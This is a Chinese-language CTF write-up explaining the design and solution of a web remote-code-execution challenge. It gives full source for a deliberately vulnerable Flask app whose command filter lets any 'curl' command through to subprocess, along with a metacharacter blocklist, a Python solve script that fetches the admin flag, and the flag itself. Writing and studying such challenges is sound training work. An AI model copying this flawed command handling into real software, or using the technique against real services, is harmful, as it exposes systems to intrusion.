#  CTF-Web_RCE的出题思路   
原创 徐睿涵  攻防SRC   2024-06-12 17:43  
  
# 1.概要  
  
这是一个基于远程代码执行（RCE）漏洞的CTF题目，选手需要通过编写Python脚本，利用漏洞获取管理员的敏感信息，获取flag。  
# 2.远程代码执行（RCE）  
  
远程代码执行（Remote Code Execution，RCE）漏洞是指攻击者能够在目标系统上执行任意代码的安全漏洞。RCE漏洞的常见原因包括输入验证不充分、不安全的系统命令调用和依赖库的漏洞。攻击者可以利用RCE漏洞执行恶意操作，如窃取数据、修改系统配置或进一步扩展攻击范围。RCE漏洞的常见原因包括：● 输入验证不充分：未对用户输入进行充分验证和过滤，导致恶意输入能够直接被执行。● 不安全的系统命令调用：在代码中直接使用不安全的系统命令调用，如使用Python的 subprocess 模块、PHP的 exec 函数等，而没有对输入进行适当的校验和过滤。● 依赖库的漏洞：所依赖的第三方库或框架中存在安全漏洞，被攻击者利用来执行任意代码。  
# 3.题目  
## 3.1.题目代码（不提供给参赛者）  
```
from flask import Flask, request, render_template_string
import subprocess
import shlex
import re

app = Flask(__name__)

HTML_TEMPLATE = '''<!DOCTYPE html><html><head>    <title>Remote Code Execution</title></head><body>    <h1>Execute Command</h1>    <form method="POST" action="/execute">        <label for="command">Command:</label>        <input type="text" id="command" name="command">        <label for="ip">IP:</label>        <input type="text" id="ip" name="ip" value="{{ request.remote_addr }}">        <input type="submit" value="Execute">    </form>    {% if result %}    <div>        <h2>Result:</h2>        <pre>{{ result }}</pre>    </div>    {% endif %}</body></html>'''

def is_valid_command(command):
    # 允许的命令列表
    allowed_commands = ['ls', 'echo', 'whoami']
    # 黑名单中的命令和字符
    forbidden_patterns = [';', '&', '|', '`', '>', '<']
    if command.startswith('curl'):
        return True
    # 检查命令是否在允许列表中
    if any(command.startswith(cmd) for cmd in allowed_commands):
        # 检查是否包含黑名单中的字符
        if not any(pattern in command for pattern in forbidden_patterns):
            return True
    return False

def is_valid_ip(ip):
    # 检查IP格式是否有效
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(ip):
        return True
    return False

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/execute', methods=['POST'])
def execute():
    command = request.form.get('command')
    ip = request.form.get('ip')
    
    # 检查命令和IP是否合法
    if not is_valid_command(command) or not is_valid_ip(ip):
        return render_template_string(HTML_TEMPLATE, result="Invalid command or IP.")
    
    try:
        # 使用shlex确保命令安全执行
        args = shlex.split(command)
        result = subprocess.run(args, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # 获取命令执行的输出
        output = result.stdout.decode('utf-8') + result.stderr.decode('utf-8')
    except Exception as e:
        # 捕获并返回异常信息
        output = str(e)
    
    log_ip(ip)
    return render_template_string(HTML_TEMPLATE, result=output)

@app.route('/admin')
def admin():
    flag = "flag{To_be_both_a_speaker_of_words_and_a_doer_of_deeds_xuruihan_is_the_author}"
    return flag

def log_ip(ip):
    with open('/tmp/ip_log.txt', 'a') as f:
        f.write(ip + '\n')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1921)

```  
## 3.2.部署方式  
  
环境：ubuntu20.04 python3+flask+配置必要的防火墙规则，允许端口1921的HTTP流量  
```
sudo apt update
sudo apt install python3 python3-pip
pip3 install flask
sudo ufw allow 1921/tcp
sudo ufw reload

```  
  
将上述代码保存为 app.py。运行应用程序：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OhSaZUmBmCOqE1SiaoXddTVgnB9AAcCmVYzgu5GgaRn9Z8509nIPlx9skjXdfnvbXDDISwtPpyTZjaNdpUtK4ew/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OhSaZUmBmCOqE1SiaoXddTVgnB9AAcCmV7lzzrfcXjQibHLXKhjPkhocjQxGIBQJpj1icqK6byF5VvZj50gAfftDQ/640?wx_fmt=png&from=appmsg "")  
# 4.解题思路  
## 4.1.分析网页  
  
访问部署在云服务器上的主页面，观察输入框、IP地址输入框和提交按钮。  
## 4.2.尝试提交命令  
  
尝试提交常见的命令观察结果。注意到只有特定命令可以执行。  
## 4.3.发现可以执行 curl 命令  
  
注意到 curl 命令被允许执行，尝试构造 curl 请求来获取 /admin 路径的内容。  
## 4.4.编写Python脚本进行远程代码执行  
  
编写一个Python脚本，通过POST请求提交 curl 命令，获取 /admin 路径的内容，从而获取flag。  
# 5.解题代码  
```
import requests

url = "http://10.211.55.65:1921/execute"

# 构造要执行的命令和伪造的IP
command = "curl http://10.211.55.65:1921/admin"
fake_ip = "10.211.55.65"

# 发送POST请求，执行命令
response = requests.post(url, data={'command': command, 'ip': fake_ip})

# 提取和打印执行结果
result = response.text
print("Command execution result:")
print(result)

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OhSaZUmBmCOqE1SiaoXddTVgnB9AAcCmV0YiaBsL5Cgkf1rxIIOrdVgXXWib0NdsI7z0rl2oibWfNKoqeUpiadD3nlg/640?wx_fmt=png&from=appmsg "")  
  
所以，本题的flag为flag{To_be_both_a_speaker_of_words_and_a_doer_of_deeds_xuruihan_is_the_author}  
# 6.题外话  
  
这道题没啥技术含量，就是一个简单的RCE漏洞，没有多少弯弯绕绕的东西。四叶草话题结束了，另外插个投票，调查一下粉丝的喜好。  
  
  
  
  
